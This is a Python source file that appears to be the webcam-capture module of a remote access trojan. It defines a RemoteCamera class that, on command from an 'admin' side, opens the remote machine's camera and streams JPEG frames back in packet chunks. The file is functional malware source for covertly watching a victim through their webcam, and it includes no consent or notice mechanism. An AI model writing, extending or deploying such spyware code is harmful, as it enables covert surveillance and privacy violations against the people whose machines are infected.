import io
import queue
import struct
import threading
import time

import cv2
from PIL import ImageGrab, Image

from RATFunction.RATFunction import RATFunction, Side
from Constants import PACKET_SIZE


class RemoteCamera(RATFunction):

    # packet_id | size | is_last | buffer
    image_chunk_packet_struct = struct.Struct(f"I I I {PACKET_SIZE - 4 - 4 - 4}s")

    # packet_id | enabled | _
    set_state_packet_struct = struct.Struct(f"I I {PACKET_SIZE - 4 - 4}s")

    def __init__(self, side, packet_queue):
        super().__init__(side, packet_queue)

        # remote vars
        self.camera = None
        self.remote_camera_condition = threading.Condition()
        self.enabled = False
        self.camera_error_image = Image.open('./resources/camera_error.jpg')
        self.camera_loading_image = Image.open('./resources/camera_loading.jpg')

        if side == Side.REMOTE_SIDE:
            threading.Thread(target=self._remote_camera_worker, daemon=True).start()

        # admin vars
        self.image_build_queue = queue.Queue()
        self.received_image_callback = lambda image_bytes: ()

    def handle_packet_admin_side(self, data):
        packet_id, size, last_flag, buffer = self.image_chunk_packet_struct.unpack(data)
        self.image_build_queue.put(buffer[:size])

        if last_flag:
            image_bytes = self.build_image()
            self.received_image_callback(image_bytes)

    def build_image(self):
        image_bytes = b''
        queue_size = self.image_build_queue.qsize()
        for i in range(queue_size):
            image_bytes += self.image_build_queue.get()

        return image_bytes

    def handle_packet_remote_side(self, data):
        packet_id, enabled, _ = self.set_state_packet_struct.unpack(data)
        if enabled != 0:
            self.enabled = True
            with self.remote_camera_condition:
                self.remote_camera_condition.notify()
        else:
            self.enabled = False

    def send_set_state(self, state: bool):
        packet = self.set_state_packet_struct.pack(self.identifier(), 1 if state else 0, bytes())
        self.packet_queue.put(packet)

    def _send_image(self, image: Image):

        with io.BytesIO() as output:
            image.save(output, format='JPEG', quality=80)
            binary_data = output.getvalue()

        offset = 0
        max_chunk_size = PACKET_SIZE - 12
        while offset < len(binary_data):
            chunk = binary_data[offset:offset + max_chunk_size]
            is_last = 1 if len(chunk) < max_chunk_size else 0

            packet = self.image_chunk_packet_struct.pack(self.identifier(), len(chunk), is_last, chunk)
            self.packet_queue.put(packet)

            offset += len(chunk)

    def _remote_camera_worker(self):
        while True:
            while not self.enabled:

                if self.camera:
                    self.camera.release()
                    self.camera = None

                with self.remote_camera_condition:
                    self.remote_camera_condition.wait()  # wait for the flag to be set to True

                self._send_image(self.camera_loading_image)
                self.camera = cv2.VideoCapture(0)

            if not self.camera.isOpened():
                self._send_image(self.camera_error_image)
                time.sleep(1)
                continue

            # Capture camera image
            ret, frame = self.camera.read()
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

            if not ret:
                self._send_image(self.camera_error_image)
                time.sleep(1)
                continue

            image = Image.fromarray(frame)
            self._send_image(image)

            time.sleep(0.1)

    def identifier(self) -> int:
        return 4
    